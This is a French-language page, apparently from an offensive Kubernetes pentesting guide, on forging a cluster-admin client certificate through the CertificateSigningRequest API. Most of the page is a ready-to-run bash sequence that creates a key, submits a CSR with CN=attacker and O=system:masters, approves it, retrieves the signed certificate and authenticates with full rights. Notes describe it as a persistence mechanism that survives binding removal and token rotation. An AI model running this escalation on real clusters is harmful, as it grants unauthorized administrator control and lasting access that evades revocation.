---
order: 6
title: "Approbation de CSR : émettre un certificat client privilégié"
description: "L'API certificates émet des certificats client signés par la CA du cluster. Une identité capable de créer une CertificateSigningRequest et de l'approuver, puis de la faire signer, obtient un certificat client pour n'importe quel nom d'utilisateur et groupe de son choix, y compris system:masters, s'authentifiant auprès de l'API server en tant qu'administrateur du cluster, indépendamment de tout token ou binding."
keywords:
  - certificatesigningrequest
  - csr
  - certificat client
  - system:masters
  - ca kubernetes
---

# Approbation de CSR

Kubernetes peut émettre des certificats client via l'API certificates : une `CertificateSigningRequest` porte une CSR dont le common name du sujet devient le nom d'utilisateur authentifié et dont les champs organisation deviennent des groupes. Si le signer du cluster l'émet et que l'identité peut à la fois créer et approuver la requête, l'attaquant reçoit un certificat pour toute identité qu'il encode, par exemple le common name `admin` dans l'organisation `system:masters`. Ce certificat s'authentifie directement auprès de l'API server, sans token ni binding à révoquer.

Vérifiez les permissions :

```bash
kubectl auth can-i create certificatesigningrequests
kubectl auth can-i update certificatesigningrequests/approval
```

## Émettre un certificat admin

```bash
# 1. generate a key and a CSR for CN=attacker, O=system:masters
openssl req -new -newkey rsa:2048 -nodes -keyout k.pem -out c.csr \
  -subj "/CN=attacker/O=system:masters"
# 2. submit it to the kube-apiserver signer
cat <<YAML | kubectl apply -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata: { name: esc }
spec:
  request: $(base64 -w0 c.csr)
  signerName: kubernetes.io/kube-apiserver-client
  usages: ["client auth"]
YAML
# 3. approve it (needs the approval permission)
kubectl certificate approve esc
# 4. pull the signed certificate and authenticate as system:masters
kubectl get csr esc -o jsonpath='{.status.certificate}' | base64 -d > crt.pem
kubectl --client-certificate=crt.pem --client-key=k.pem \
  --server=$APISERVER --insecure-skip-tls-verify auth can-i '*' '*'
```

## Notes d'exploitation

- Le common name devient le nom d'utilisateur et chaque organisation devient un groupe, si bien que `O=system:masters` produit un certificat cluster-admin via le binding par défaut.
- Il faut à la fois create et approve ; certains clusters auto-approuvent certains signers, auquel cas create seul suffit. Le signer `kubernetes.io/kube-apiserver-client` est celui qui produit les certificats client d'API.
- Un certificat client signé est durable : il n'est pas révoqué par la suppression d'un binding ni par la rotation d'un token, c'est donc aussi un mécanisme de persistance jusqu'à ce que la CA soit renouvelée ou que le certificat expire.

## Références

- [Kubernetes: certificate signing requests](https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/)
- [Kubernetes: certificates and CA](https://kubernetes.io/docs/tasks/administer-cluster/certificates/)
- [HackTricks: Kubernetes CSR](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-role-based-access-control-rbac)
